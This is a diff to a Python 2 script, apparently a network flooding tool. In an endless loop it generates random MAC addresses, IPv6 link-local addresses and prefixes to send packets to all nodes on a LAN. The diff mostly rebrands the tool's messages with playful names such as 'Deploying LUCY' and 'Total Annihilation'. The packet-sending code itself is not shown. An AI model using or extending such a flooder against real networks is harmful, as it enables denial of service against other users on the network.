@@ -7,12 +7,12 @@ import random
 a = 1
 
 try:
-    	print " Welcome to Easy-Attack tool: This tool is created for IIDT project. This is written in Python. This tool will send Packets with randowm IPv6, Mac and IP Prefix."
-    	interface = raw_input("Select the interface (usually eth0 or wlan0) you want to use: ")
-	print "Now sending packets to all nodes in the LAN."
+    	print " Welcome to the PARTY!!!!."
+    	interface = raw_input("\nSelect Network Interace: ")
+	print "\nDeploying LUCY. Let's DANCE!!! "
 
 	while a > 0:
-	    mac = "00:18:" + ":".join(("%02x" % random.randint(0, 255) for i in range(4)))
+	    mac = "aa:11:" + ":".join(("%02x" % random.randint(0, 255) for i in range(4)))
 	    ipv6 = "fe80::218:" + ":".join(("%x" % random.randint(0, 16**4) for i in range(3)))
 	    prefix1 = "2a01:" + ":".join(("%x" % random.randint(0, 16**4) for i in range(3))) + "::"
 
@@ -27,7 +27,7 @@ try:
 	    print "*",
 	    a = a+1
 except KeyboardInterrupt:
-    print "Process Interrupted by user"
+    print "Asmodeus Interrupted"
 
-print "Total %d packets sent" %a
+print "Total Annihilation: %d " %a
 
